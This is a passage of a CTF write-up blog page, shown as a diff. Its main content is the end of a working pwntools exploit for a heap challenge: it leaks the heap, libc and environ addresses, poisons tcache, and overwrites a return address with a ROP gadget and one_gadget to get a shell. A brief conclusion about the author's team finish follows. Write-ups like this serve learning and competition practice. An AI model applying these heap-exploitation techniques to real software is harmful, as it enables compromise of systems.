+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;input:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;idx&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;name&#34;</span>,name)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;topic cnt&#34;</span>,str(topic_cnt)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(topic_cnt):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;topic&gt;&#34;</span>,topics[i])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> do_photo:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;photo?&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;width?&#34;</span>,str(width)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;height&#34;</span>,str(height)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;reading photo below&gt;&gt;&#34;</span>,photo)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>         io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;photo?&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;n&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">vote_ctf</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;input:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ctf idx:&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove_ctf</span>(idx):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;input:&#34;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;idx?&#34;</span>,str(idx)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mangle</span>(dest,pos):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (pos <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">^</span> dest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak heap and libc</span>
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">False</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;a&#34;</span>]) <span style="color:#75715e"># make topic to prevent consolidation</span>
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;BBBB&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">False</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;b&#34;</span>])
+</span></span><span style="display:flex;"><span>remove_ctf(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>remove_ctf(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x900</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1337133713371337</span>)
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">True</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">32767</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,payload,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;a&#34;</span>])
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(p64(<span style="color:#ae81ff">0x1337133713371337</span>))
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x131a0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;HEAP BASE: &#34;</span> <span style="color:#f92672">+</span> hex(heap_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>remove_ctf(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>fake_str <span style="color:#f92672">=</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x11eb0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fake_str<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x900</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1337133713371337</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x12878</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x12898</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x12898</span>)
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">True</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">32767</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,payload,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;a&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(vote_ctf(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">0x5d</span>:<span style="color:#ae81ff">0x5d</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x219ce0</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;placeholder&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">False</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;a&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># leak environ</span>
+</span></span><span style="display:flex;"><span>fake_str <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x221200</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fake_str<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x900</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1337133713371337</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x13208</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x13228</span>) <span style="color:#f92672">+</span> p64(heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x13228</span>)
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">True</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">32767</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,payload,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;a&#34;</span>])
+</span></span><span style="display:flex;"><span>environ <span style="color:#f92672">=</span> u64(vote_ctf(<span style="color:#ae81ff">0</span>)[<span style="color:#ae81ff">0x108</span>:<span style="color:#ae81ff">0x108</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;ENVIRON: &#34;</span> <span style="color:#f92672">+</span> hex(environ))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># all bins are empty now, setup heap for tcache poisoning</span>
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">3</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">False</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>]) <span style="color:#75715e"># for some reason, this will free a 0x50 chunk</span>
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">False</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,topics<span style="color:#f92672">=</span>[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>]) <span style="color:#75715e"># this sets it up so that two 0x30 chunks are together</span>
+</span></span><span style="display:flex;"><span>remove_ctf(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># in memory, there is now: free object chunk, followed by two 0x30 tcache chunks</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io,gdbscript=&#34;x/8gx 0x55555555c2c0\n heap set-arena 0x1555552acc80&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite fd ptr in tcache</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> environ <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x148</span>
+</span></span><span style="display:flex;"><span>fd_overwrite  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x900</span>  <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x1337133713371337</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>fd_overwrite <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#f92672">+</span> p64(mangle(ret,heap_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14ed0</span>))
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">5</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#66d9ef">True</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">32767</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,fd_overwrite)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># overwrite ret pointer</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#gdb.attach(io,gdbscript=&#34;break *0x555555556c2e&#34;)</span>
+</span></span><span style="display:flex;"><span>pop_rcx <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8c6bb</span>)
+</span></span><span style="display:flex;"><span>one_gadget <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50a37</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pop_rcx <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> one_gadget
+</span></span><span style="display:flex;"><span>add_ctf(<span style="color:#ae81ff">6</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">False</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,topics<span style="color:#f92672">=</span>[payload])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>This was the first time I got on the podium after playing so many ctfs, and to do it representing Malaysia, was really exciting. I really have to thank my teammates <a href="https://vicevirus.github.io/">Firdaus</a>, <a href="https://tzion0.github.io/">Teng</a>, <a href="https://www.linkedin.com/in/noorraihan/">Raihan</a>, for all of their hardwork. Also thanks to the entirety of team Malaysia for making the trip so fun, everyone did great!</p>
+<p><img loading="lazy" src="/acs24/team_selfie.JPG" alt=""  />
+</p>
+<p>Thanks a lot to the organisers as well, the hotel and venue they booked were really top tier. I had a lot of fun with the pwn challs too, but I think some of them required too much reversing, and they should&rsquo;ve given the source code.</p>
+<p>Happy that I met quite a few friends from previous events too! Ha Long Bay was great, really good food, and really nice views. Had a great time.</p>
+<p><img loading="lazy" src="/acs24/view.jpg" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://zh1ren.github.io/">zhiren</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
